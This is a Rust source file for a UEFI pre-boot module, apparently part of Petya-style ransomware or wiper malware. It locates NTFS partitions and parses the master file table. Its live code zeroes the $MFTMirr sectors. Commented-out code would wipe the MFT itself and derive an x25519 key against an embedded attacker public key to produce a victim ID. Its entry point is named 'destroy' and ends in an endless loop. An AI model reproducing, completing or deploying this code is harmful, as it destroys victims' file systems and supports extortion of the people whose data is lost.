use alloc::vec;
use alloc::vec::Vec;
use core::ops::Range;
use rand::rngs::OsRng;
use uefi::{Error, Status};

use uefi::prelude::SystemTable;
use uefi::proto::media::block::BlockIO;
use uefi::table::Boot;
use x25519_dalek::{EphemeralSecret, PublicKey};

use crate::file::read_file;
use crate::file::write_file;

const OEM_ID: &[u8; 8] = b"NTFS    ";

fn read_mft_entry(
    blk: &BlockIO,
    media_id: u32,
    entry_nb: u64,
    buf: &mut [u8],
    entry_buf: &mut [u8],
) -> uefi::Result {
    // Read the first half of the file record
    blk.read_blocks(media_id, entry_nb, buf)?;

    // If it doesn't start the file FILE signature then get out
    if &buf[0..4] != b"FILE" {
        return Err(Error::from(Status::COMPROMISED_DATA));
    }
    // Then put in the entry buffer
    entry_buf[..512].copy_from_slice(&buf[..512]);

    // Read the other half
    blk.read_blocks(media_id, entry_nb + 1, buf)?;
    entry_buf[512..(512 + 512)].copy_from_slice(&buf[..512]);

    // We're good
    Ok(())
}

fn get_mft_ranges(
    blk: &mut BlockIO,
    media_id: u32,
    boot_sector: u64,
    buf: &mut [u8],
) -> uefi::Result<Vec<Range<u64>>> {
    // Read Boot Sector, which is the first sector of NTFS partition
    blk.read_blocks(media_id, boot_sector, buf)?;

    // Get start sector of $MFT and $MFTMirr from Boot Sector
    let mft_start = u64::from_ne_bytes(buf[48..56].try_into().unwrap());
    let mft_start = (mft_start * 8) + boot_sector;
    let mft_mir_start = u64::from_ne_bytes(buf[56..64].try_into().unwrap());
    let mft_mir_start = (mft_mir_start * 8) + boot_sector;

    // Destroy the $MFTMirr cluster, do it here cause it's only 8 sectors to overwrite
    let buf2 = [0u8; 512];
    for sector in mft_mir_start..mft_mir_start + 8 {
        blk.write_blocks(media_id, sector, &buf2)?;
    }

    // Prepare a buffer with the size of a file record entry
    let mut mft_entry_buf = [0u8; 1024];

    // Read the $MFT file record entry, which is the first entry of the MFT zone
    read_mft_entry(blk, media_id, mft_start, buf, &mut mft_entry_buf)?;

    // Get the first attribute offset from of file record entry header
    let mut first_attribute_offset =
        u16::from_ne_bytes(mft_entry_buf[20..22].try_into().unwrap()) as usize;

    // Iterate over attributes header until finding the $DATA attribute (0x80) or end (0xFF)
    let mut data_run_offset = 0;
    loop {
        if mft_entry_buf[first_attribute_offset] == 0x80 {
            data_run_offset = u16::from_ne_bytes(
                mft_entry_buf[first_attribute_offset + 32..first_attribute_offset + 34]
                    .try_into()
                    .unwrap(),
            ) as usize;
            data_run_offset += first_attribute_offset;
            break;
        } else if mft_entry_buf[first_attribute_offset] == 0xFF {
            break;
        } else {
            let length = u32::from_ne_bytes(
                mft_entry_buf[first_attribute_offset + 4..first_attribute_offset + 8]
                    .try_into()
                    .unwrap(),
            ) as usize;

            first_attribute_offset += length
        }
    }

    // If it doesn't find the $DATA (which would be odd) get out
    if data_run_offset == 0 {
        return Err(Error::from(Status::COMPROMISED_DATA));
    };

    let mut ranges: Vec<Range<u64>> = vec![];

    loop {
        match mft_entry_buf[data_run_offset] {
            0x31 => {
                let data_run_size = (mft_entry_buf[data_run_offset + 1] as u64) * 8;
                let mut data_run_first =
                    mft_entry_buf[data_run_offset + 2..data_run_offset + 5].to_vec();
                data_run_first.push(0);
                let data_run_first =
                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;

                ranges.push(data_run_first..data_run_first + data_run_size);
                data_run_offset += 5;
            }

            0x32 => {
                let data_run_size = (u16::from_ne_bytes(
                    mft_entry_buf[data_run_offset + 1..data_run_offset + 3]
                        .try_into()
                        .unwrap(),
                ) * 8) as u64;

                let mut data_run_first =
                    mft_entry_buf[data_run_offset + 3..data_run_offset + 6].to_vec();
                data_run_first.push(0);
                let data_run_first =
                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;

                ranges.push(data_run_first..data_run_first + data_run_size);
                data_run_offset += 6;
            }

            0x33 => {
                let mut data_run_size =
                    mft_entry_buf[data_run_offset + 1..data_run_offset + 4].to_vec();
                data_run_size.push(0);
                let data_run_size =
                    (u16::from_ne_bytes(data_run_size.try_into().unwrap()) * 8) as u64;
                let mut data_run_first =
                    mft_entry_buf[data_run_offset + 4..data_run_offset + 7].to_vec();
                data_run_first.push(0);
                let data_run_first =
                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
                ranges.push(data_run_first..data_run_first + data_run_size);
                data_run_offset += 7;
            }

            0x42 => {
                let data_run_size = (u16::from_ne_bytes(
                    mft_entry_buf[data_run_offset + 1..data_run_offset + 3]
                        .try_into()
                        .unwrap(),
                ) * 8) as u64;
                let data_run_first = (u32::from_ne_bytes(
                    mft_entry_buf[data_run_offset + 3..data_run_offset + 7]
                        .try_into()
                        .unwrap(),
                ) * 8) as u64;
                ranges.push(data_run_first..data_run_first + data_run_size);
                data_run_offset += 7;
            }

            _ => break,
        }
    }

    log::info!("{:#?}", ranges);

    Ok(ranges)
}

/*/// Fire !
fn beat_the_shit_out_of_the_mft(
    blk: &mut BlockIO,
    media_id: u32,
    mft_runs: Vec<Range<u64>>,
    key: [u8; 32],
) -> uefi::Result {
    let buf = [0u8; 512];

    log::info!("Start destroying..."); // DEBUG

    for run in mft_runs {
        for sector in run {
            if sector % 2 == 0 {
                // TODO: cipher block
                blk.write_blocks(media_id, sector, &buf)?;
            }
        }
    }

    log::info!("Finished !"); // DEBUG

    Ok(())
}*/

pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
    // Get list of handles which instantiate a BlockIO
    let handles = st.boot_services().find_handles::<BlockIO>()?;
    for handle in handles {
        let blk = st.boot_services().handle_protocol::<BlockIO>(handle)?;

        let blk = unsafe { &mut *blk.get() };
        let blk_media = blk.media();
        let media_id = blk_media.media_id();
        let _block_size = blk_media.block_size();
        let _low_lba = blk_media.lowest_aligned_lba();

        let mut buf = [0u8; 512];
        blk.read_blocks(media_id, 0, &mut buf)?;

        // If not a NTFS partition then get out
        if &buf[3..11] != OEM_ID {
            continue;
        }

        if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {

            //log::info!("{:#?}", ranges);

            /*let public_key_hex = include_str!("include/public_key.hex");
            let mut buf = [0u8; 32];
            hex::decode_to_slice(public_key_hex, &mut buf).expect("Public key hex to bytes");
            let public_key = PublicKey::from(buf);

            let rng = OsRng;
            let secret = EphemeralSecret::new(rng);
            let id = PublicKey::from(&secret);
            let key = secret.diffie_hellman(&public_key);

            let mut buf = [0u8; 64];
            hex::encode_to_slice(id.as_bytes(), &mut buf).expect("id to hex");

            write_file(st, "id", &buf).unwrap();

            // TODO: save ranges somewhere
            let mut ranges_buffer = vec![0u8; ranges.len() * 16];

            for range in &ranges {
                ranges_buffer.extend(range.start.to_be_bytes());
                ranges_buffer.extend(range.end.to_be_bytes());
            }
            ranges_buffer.extend(0u64.to_be_bytes());

            write_file(st, "ranges", ranges_buffer.as_slice()).unwrap();

            let ranges_text = read_file(st, "ranges").unwrap();
            let mut ranges2 = Vec::<Range<u64>>::new();
            loop {
                let c = ranges2.len() * 16;
                let start = u64::from_be_bytes(ranges_text[c..c + 8].try_into().unwrap());
                if start == 0u64 {
                    break;
                }

                let end = u64::from_be_bytes(ranges_text[c + 8..c + 16].try_into().unwrap());
                ranges2.push(start..end);
            }

            log::info!("Ranges1: {:?}", ranges);
            log::info!("Ranges2: {:?}", ranges2);*/

            //beat_the_shit_out_of_the_mft(blk, media_id, ranges, key.to_bytes());
            //log::info!("{:#?}", ranges); // DEBUG
        }
    }

    loop {}

    Ok(())
}
